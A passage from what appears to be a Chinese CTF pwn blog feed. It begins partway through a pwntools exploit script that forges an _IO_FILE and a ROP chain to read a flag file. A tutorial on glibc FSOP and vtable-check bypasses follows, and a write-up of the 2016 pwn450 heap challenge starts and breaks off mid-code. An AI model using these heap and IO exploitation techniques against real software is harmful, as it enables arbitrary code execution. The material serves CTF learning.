class="hljs-number">0x1d2cc0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<span class="hljs-comment">#p3</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>_IO_list_all=libcbase+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext=libcbase+<span class="hljs-number">0x40eb5</span><br>ret_addr=libcbase+<span class="hljs-number">0x270c2</span><br>edit(<span class="hljs-number">0</span>,p64(libcbase+<span class="hljs-number">0x1d3100</span>)+p64(libcbase+<span class="hljs-number">0x1d3100</span>)+p64(heap)+p64(_IO_list_all-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>)<br>heap=heap-<span class="hljs-number">0x290</span>+<span class="hljs-number">0xd00</span><br>fake_IO=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">1</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(heap+<span class="hljs-number">0xe0</span>)+p64(heap+<span class="hljs-number">0x200</span>)+p64(ret_addr)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xc0</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xd8</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(libcbase+<span class="hljs-number">0x1cf0a0</span>+<span class="hljs-number">0x30</span>)<br>fake_IO_wide=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_wide+=p64(heap+<span class="hljs-number">8</span>)<br>fake_IO_wide=fake_IO_wide.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_wide+=p64(heap+<span class="hljs-number">0x1c8</span>)<br>fake_IO+=fake_IO_wide<br>fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(setcontext)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rdi_addr=libcbase+<span class="hljs-number">0x27725</span><br>rsi_addr=libcbase+<span class="hljs-number">0x28ed9</span><br>rdx_addr=libcbase+<span class="hljs-number">0xfdd4d</span><br>fake_IO+=p64(rdi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>fake_IO+=p64(rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(rsi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)+p64(read_addr)<br>fake_IO+=p64(rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(rsi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)+p64(write_addr)<br>edit(<span class="hljs-number">2</span>,fake_IO)<br>gdb.attach(p)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br>pause()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FSOP</title>
    <link href="/2023/02/20/FSOP/"/>
    <url>/2023/02/20/FSOP/</url>
    
    <content type="html"><![CDATA[<p>开——学——啦——真——开——心——啊——o(<em>￣▽￣</em>)ブ<br>IO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง</p><span id="more"></span><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><h3 id="vtable劫持"><a href="#vtable劫持" class="headerlink" title="vtable劫持"></a>vtable劫持</h3><p>许多IO相关函数都调用了_IO_FILE_plus结构体中的vtable指针指向的跳转表中的函数，如果能够劫持vtable那么我们就能改变程序流<br>劫持vtable有两种方式，只修改_IO_FILE结构体的vtable指针或者直接伪造整个_IO_FILE结构体</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>全局变量_IO_list_all利用单链表管理所有_IO_FILE结构体，如果我们能够控制_IO_list_all或者控制某个_IO_FILE的_chain指针，我们就能进行伪造_IO_FILE结构体的vtable劫持<br>_IO_flush_all_lockp函数用于刷新所有FILE结构体的输出缓冲区，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">int</span> last_stamp;<br><br>  last_stamp = _IO_list_all_stamp;<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   )<span class="hljs-comment">//如果输出缓冲区有数据，则调用_IO_OVERFLOW刷新输出缓冲区</span><br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (last_stamp != _IO_list_all_stamp)<br>&#123;<br>  <span class="hljs-comment">/* Something was added to the list.  Start all over again.  */</span><br>  fp = (_IO_FILE *) _IO_list_all;<br>  last_stamp = _IO_list_all_stamp;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>fp = fp-&gt;_chain;<span class="hljs-comment">//遍历单链表</span><br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (do_lock)<br>    _IO_lock_unlock (list_all_lock);<br>  __libc_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用_IO_flush_all_lockp的过程有：</p><ul><li>libc执行abort函数时，堆非法操作可触发，调用栈如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">fflush(_IO_fflush)-&gt;_IO_flush_all-&gt;_IO_flush_all_lockp<br><span class="hljs-built_in">abort</span><br>__libc_message<br>malloc_printerr<br></code></pre></td></tr></table></figure></li><li>调用exit函数时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp<br>_IO_cleanup<br>_run_exit_handlers<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li>程序正常退出时（同调用exit，因为程序正常退出的时候会调用exit）<br>整个利用过程就是劫持_IO_list_all或者某个_IO_FILE的_chain指针，然后通过以上三种方式触发_IO_flush_all_lockp函数调用</li></ul><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW<br></code></pre></td></tr></table></figure><h2 id="2-24-2-27"><a href="#2-24-2-27" class="headerlink" title="2.24-2.27"></a>2.24-2.27</h2><h3 id="vtable-check"><a href="#vtable-check" class="headerlink" title="vtable check"></a>vtable check</h3><p>2.24中_IO_OVERFLOW的宏定义发生了变化（以下宏定义皆来自glibc-2.24\libio\libioP.h）  </p><ul><li>_IO_OVERFLOW<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span><br></code></pre></td></tr></table></figure></li><li>JUMP1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure></li><li>_IO_JUMPS_FUNC<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)\</span><br><span class="hljs-meta">     + (THIS)-&gt;_vtable_offset)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li></ul><p>可见在利用vtable跳转表之前先执行了IO_validate_vtable函数，作用是检查vtable是否在glibc的vtable段里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\libioP.h</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见__start___libc_IO_vtables指向第一个vtable _IO_helper_jumps，__stop___libc_IO_vtables指向最后一个vtable _IO_str_chk_jumps的结尾<br>如果还像2.23那样在堆上伪造vtable肯定无法绕过检查，会进入到_IO_vtable_check函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\vtables.c</span><br><br><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//检查是否是外部重构的vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br><span class="hljs-comment">//检查是否是动态链接库中的vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说我们只能以vtable段中的内容为跳板进行利用</p><h3 id="vtable-check绕过"><a href="#vtable-check绕过" class="headerlink" title="vtable check绕过"></a>vtable check绕过</h3><p>利用_IO_str_jumps（也可以利用_IO_wstr_jumps，过程差不多）<br>查看一下_IO_str_jumps：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strop.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中有一个finish，实际上执行的函数是_IO_str_finish，其中有一个相对地址的引用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要控制：</p><ul><li>fp-&gt;_IO_buf_base&#x3D;bin_sh_addr</li><li>fp-&gt;_flags&#x3D;0</li><li>((_IO_strfile *) fp)-&gt;_s._free_buffer&#x3D;system_addr</li></ul><p>_IO_strfile，这些结构体是嵌套定义的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strfile.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_strfile_</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span> _<span class="hljs-title">sbf</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span> _<span class="hljs-title">s</span>;</span><br>&#125; _IO_strfile;<br></code></pre></td></tr></table></figure><p>伪造的_IO_strfile长这样</p><img src="/2023/02/20/FSOP/IO_strfile.png" class title="IO_strfile"><p>其中的overflow也有对相对地址的引用，但过程非常复杂，利用起来很不方便</p><h3 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_str_finish<br></code></pre></td></tr></table></figure><h2 id="2-28以后"><a href="#2-28以后" class="headerlink" title="2.28以后"></a>2.28以后</h2><p>_IO_str_finish中的相对地址引用被free替换，_IO_str_overflow中的相对引用也被malloc和free替换了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br><br><span class="hljs-comment">//用free替换了相对地址引用</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="东华杯2016-pwn450-note（2-23）"><a href="#东华杯2016-pwn450-note（2-23）" class="headerlink" title="东华杯2016-pwn450 note（2.23）"></a>东华杯2016-pwn450 note（2.23）</h2><p>很坐牢也很涨姿势的一道题</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>只能使用一个堆块且无uaf，但edit使用的read_data2函数中存在溢出（只根据’\n’判断读入结束）</p><img src="/2023/02/20/FSOP/read_data.png" class title="read_data"><p>new一个堆块的时候会打印堆块地址</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>申请一个很大的chunk，mmap出来的内存会紧邻libc<br>当top chunk不能满足分配的大小时_int_malloc会调用sysmalloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>当要求的大小nb&gt;&#x3D;mp_.mmap_threshold（0x20000）时会调用系统调用mmap分配内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>    &#123;<br>      <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>    try_mmap:<br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>      <span class="hljs-keyword">else</span><br>        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>      tried_mmap = <span class="hljs-literal">true</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>        &#123;<br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<span class="hljs-comment">//系统调用mmap</span><br></code></pre></td></tr></table></figure><p>分配的内存紧邻libc向下延伸（0x7fc3d4bff000）</p><img src="/2023/02/20/FSOP/mmap.png" class title="mmap"><p>mmap的chunk也有0x10的chunk head同时必须保持页对齐，由于程序会打印堆块地址，根据堆块大小和堆块基址我们就能知道libc基址</p><h4 id="创造多个chunk"><a href="#创造多个chunk" class="headerlink" title="创造多个chunk"></a>创造多个chunk</h4><p>要触发unsorted bin attack就必须要能在free的状态下控制chunk，但程序不存在uaf。要通过edit的溢出漏洞实现uaf至少需要两个chunk（一个在bin里，一个in use），如果遵循程序的正常流程，free掉的chunk必然和top chunk合并（只能申请0x210大小以上的chunk，在fastbin的范围外）<br>当top chunk不满足分配要求且要求的size符合一定要求时会free旧的top chunk，旧top chunk会进入unsorted bin<br>当nb&lt;mp_.mmap_threshold（0x20000）且旧top chunk需要满足以下要求</p><ul><li>size&gt;0x20</li><li>pre_inuse&#x3D;1</li><li>top chunk address+top chunk size满足页对齐<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>之后再分割旧top chunk就不存在合并的问题了</li></ul><h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p>这道题要进行unsorted bin attack有一个问题，就是在malloc之前必须free掉原来的chunk，但已经完成unsorted bin attack布置的堆块不能绕过_int_free中对unsorted bin中第一个chunk的连接检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = unsorted_chunks(av);<br>fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br><span class="hljs-keyword">goto</span> 